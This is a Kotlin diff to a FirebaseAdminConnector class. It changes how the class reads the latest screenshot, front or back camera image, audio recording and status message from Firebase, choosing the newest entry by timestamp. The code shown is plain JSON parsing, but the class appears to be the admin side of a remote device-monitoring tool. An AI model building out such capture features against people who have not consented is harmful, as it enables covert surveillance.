@@ -246,9 +246,29 @@ class FirebaseAdminConnector {
                 val bodyStr = response.body?.string() ?: return@withContext null
                 if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                 
-                val json = JSONObject(bodyStr)
-                val status = json.optString("status", "unknown")
-                val message = json.optString("message", "")
+                val rootJson = JSONObject(bodyStr)
+                var latestObj: JSONObject? = null
+                var latestTimestamp = 0L
+
+                if (rootJson.has("status")) {
+                    latestObj = rootJson
+                } else {
+                    val keys = rootJson.keys()
+                    while (keys.hasNext()) {
+                        val key = keys.next()
+                        val obj = rootJson.optJSONObject(key) ?: continue
+                        val ts = obj.optLong("timestamp", 0L)
+                        if (ts >= latestTimestamp) {
+                            latestTimestamp = ts
+                            latestObj = obj
+                        }
+                    }
+                }
+
+                if (latestObj == null) return@withContext null
+
+                val status = latestObj.optString("status", "unknown")
+                val message = latestObj.optString("message", "")
                 return@withContext Pair(status, message)
             }
         } catch (e: Exception) {
@@ -470,15 +490,38 @@ class FirebaseAdminConnector {
                 val bodyStr = response.body?.string() ?: return@withContext null
                 if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                 
-                val json = JSONObject(bodyStr)
-                val base64 = json.optString("base64", "")
+                // If it's a map (common when using push()), find the latest one
+                val rootJson = JSONObject(bodyStr)
+                var latestObj: JSONObject? = null
+                var latestTimestamp = 0L
+
+                if (rootJson.has("image") || rootJson.has("base64")) {
+                    // It's a single object
+                    latestObj = rootJson
+                    latestTimestamp = rootJson.optLong("timestamp", 0L)
+                } else {
+                    // It's a map of ID -> Object
+                    val keys = rootJson.keys()
+                    while (keys.hasNext()) {
+                        val key = keys.next()
+                        val obj = rootJson.optJSONObject(key) ?: continue
+                        val ts = obj.optLong("timestamp", 0L)
+                        if (ts >= latestTimestamp) {
+                            latestTimestamp = ts
+                            latestObj = obj
+                        }
+                    }
+                }
+
+                if (latestObj == null) return@withContext null
+
+                val base64 = latestObj.optString("image", latestObj.optString("base64", ""))
                 if (base64.isBlank()) return@withContext null
-                val timestamp = json.optLong("timestamp", System.currentTimeMillis())
                 
                 return@withContext MediaItem(
-                    id = "screenshot_${timestamp}",
+                    id = "screenshot_${latestTimestamp}",
                     base64 = base64,
-                    timestamp = timestamp,
+                    timestamp = latestTimestamp,
                     type = "screenshot"
                 )
             }
@@ -499,16 +542,36 @@ class FirebaseAdminConnector {
                 val bodyStr = response.body?.string() ?: return@withContext null
                 if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                 
-                val json = JSONObject(bodyStr)
-                val base64 = json.optString("base64", "")
+                val rootJson = JSONObject(bodyStr)
+                var latestObj: JSONObject? = null
+                var latestTimestamp = 0L
+
+                if (rootJson.has("image") || rootJson.has("base64")) {
+                    latestObj = rootJson
+                    latestTimestamp = rootJson.optLong("timestamp", 0L)
+                } else {
+                    val keys = rootJson.keys()
+                    while (keys.hasNext()) {
+                        val key = keys.next()
+                        val obj = rootJson.optJSONObject(key) ?: continue
+                        val ts = obj.optLong("timestamp", 0L)
+                        if (ts >= latestTimestamp) {
+                            latestTimestamp = ts
+                            latestObj = obj
+                        }
+                    }
+                }
+
+                if (latestObj == null) return@withContext null
+
+                val base64 = latestObj.optString("image", latestObj.optString("base64", ""))
                 if (base64.isBlank()) return@withContext null
-                val timestamp = json.optLong("timestamp", System.currentTimeMillis())
-                val camera = json.optString("camera", "back")
+                val camera = if (latestObj.optBoolean("isFront", false)) "front" else latestObj.optString("camera", "back")
                 
                 return@withContext MediaItem(
-                    id = "camera_${timestamp}",
+                    id = "camera_${latestTimestamp}",
                     base64 = base64,
-                    timestamp = timestamp,
+                    timestamp = latestTimestamp,
                     type = "camera",
                     cameraType = camera
                 )
@@ -530,15 +593,35 @@ class FirebaseAdminConnector {
                 val bodyStr = response.body?.string() ?: return@withContext null
                 if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                 
-                val json = JSONObject(bodyStr)
-                val base64 = json.optString("base64", "")
+                val rootJson = JSONObject(bodyStr)
+                var latestObj: JSONObject? = null
+                var latestTimestamp = 0L
+
+                if (rootJson.has("audio") || rootJson.has("base64")) {
+                    latestObj = rootJson
+                    latestTimestamp = rootJson.optLong("timestamp", 0L)
+                } else {
+                    val keys = rootJson.keys()
+                    while (keys.hasNext()) {
+                        val key = keys.next()
+                        val obj = rootJson.optJSONObject(key) ?: continue
+                        val ts = obj.optLong("timestamp", 0L)
+                        if (ts >= latestTimestamp) {
+                            latestTimestamp = ts
+                            latestObj = obj
+                        }
+                    }
+                }
+
+                if (latestObj == null) return@withContext null
+
+                val base64 = latestObj.optString("audio", latestObj.optString("base64", ""))
                 if (base64.isBlank()) return@withContext null
-                val timestamp = json.optLong("timestamp", System.currentTimeMillis())
                 
                 return@withContext MediaItem(
-                    id = "audio_${timestamp}",
+                    id = "audio_${latestTimestamp}",
                     base64 = base64,
-                    timestamp = timestamp,
+                    timestamp = latestTimestamp,
                     type = "audio"
                 )
             }
